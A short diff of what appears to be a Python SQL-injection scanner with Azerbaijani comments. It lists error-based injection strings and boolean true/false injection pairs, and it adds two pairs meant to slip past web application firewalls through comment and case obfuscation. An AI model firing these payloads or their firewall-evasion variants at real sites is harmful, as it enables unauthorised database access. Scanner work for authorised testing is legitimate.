@@ -29,13 +29,15 @@ SQL_XETA = re.compile(
 
 ERROR_PAYLOAD = ["'", '"', "')", "' --", "`", "''", "\")", "' OR '1'='1' -- ", "1'1"]
 
-# Boolean cütləri: (DOĞRU, YALAN)
+# Boolean cütləri: (DOĞRU, YALAN) — bəziləri WAF-bypass (inline comment, case)
 BOOL_CUT = [
     ("' AND '1'='1", "' AND '1'='2"),
     ('" AND "1"="1', '" AND "1"="2'),
     (" AND 1=1-- -", " AND 1=2-- -"),
     ("' AND 1=1-- -", "' AND 1=2-- -"),
     ("') AND ('1'='1", "') AND ('1'='2"),
+    ("'/**/AnD/**/1=1-- -", "'/**/AnD/**/1=2-- -"),   # WAF-bypass: comment+case
+    ("' AND 1 LIKE 1-- -", "' AND 1 LIKE 2-- -"),      # 'AND 1=1' bloklananda
 ]
 
 GOZLEME = 5
